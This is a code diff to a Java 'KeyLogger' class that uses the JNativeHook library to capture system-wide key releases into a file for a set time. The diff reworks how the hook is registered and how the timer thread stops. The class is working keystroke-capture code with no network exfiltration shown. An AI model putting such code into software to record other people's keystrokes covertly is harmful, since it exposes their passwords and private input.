@@ -1,25 +1,23 @@
 package com.util;
 
-import java.io.BufferedOutputStream;
-import java.io.BufferedWriter;
-import java.io.FileWriter;
-import java.io.IOException;
-import java.security.Key;
-import java.util.concurrent.ExecutionException;
-import java.util.concurrent.Executors;
-import java.util.concurrent.TimeUnit;
-
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
+import java.io.FileWriter;
+import java.io.IOException;
+
 public class KeyLogger {
     private static KeyLogger instance = new KeyLogger();
     public Boolean isLogging = false;
 
-    private KeyLogger() { //Constructor for Keylogger
-
+    private KeyLogger() {
+        try {
+            GlobalScreen.registerNativeHook();
+        } catch (NativeHookException e) {
+            System.out.println("Some error with hook");
+        }
     }
 
     public static KeyLogger getInstance() {
@@ -28,7 +26,7 @@ public class KeyLogger {
 
     public void startLog(String filename, long time) throws IOException {
         FileWriter writer = new FileWriter(filename,false);
-        GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
+        NativeKeyListener listener = new NativeKeyListener() {
             @Override
             public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
                 try {
@@ -40,32 +38,33 @@ public class KeyLogger {
                     e.printStackTrace();
                 }
             }
+        };
+        long t1 = System.currentTimeMillis();
+        GlobalScreen.addNativeKeyListener(listener);
+        Thread thread = new Thread(() -> {
+            while (true) {
+                try {
+                    Thread.sleep(100);
+                    if (System.currentTimeMillis() - t1 > time) {
+                        GlobalScreen.removeNativeKeyListener(listener);
+                        break;
+                    }
+                } catch (InterruptedException e) {
+                    System.out.println("error when stopping");
+                    e.printStackTrace();
+                }
+            }
         });
-
+        thread.start();
         try {
-            System.out.println("StartLog");
-            GlobalScreen.registerNativeHook();
-        } catch (NativeHookException e) {
-            System.out.println("Cannot logging");
+            thread.join();
+        } catch (InterruptedException e) {
             e.printStackTrace();
         }
-        var pool = Executors.newScheduledThreadPool(1);
-        var a = pool.schedule(() -> {
-            try {
-                GlobalScreen.unregisterNativeHook();
-            } catch (NativeHookException e) {
-                throw new RuntimeException(e);
-            }
-        }, time, TimeUnit.MILLISECONDS);
-        try {
-            a.get();
-        } catch (InterruptedException | ExecutionException e) {
-            System.out.println("Cannot stop log");
-            e.printStackTrace();
-        } finally {
-            pool.shutdown();
+        finally {
             writer.close();
         }
+
     }
 
 
@@ -75,5 +74,5 @@ public class KeyLogger {
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
- }
+    }
 }
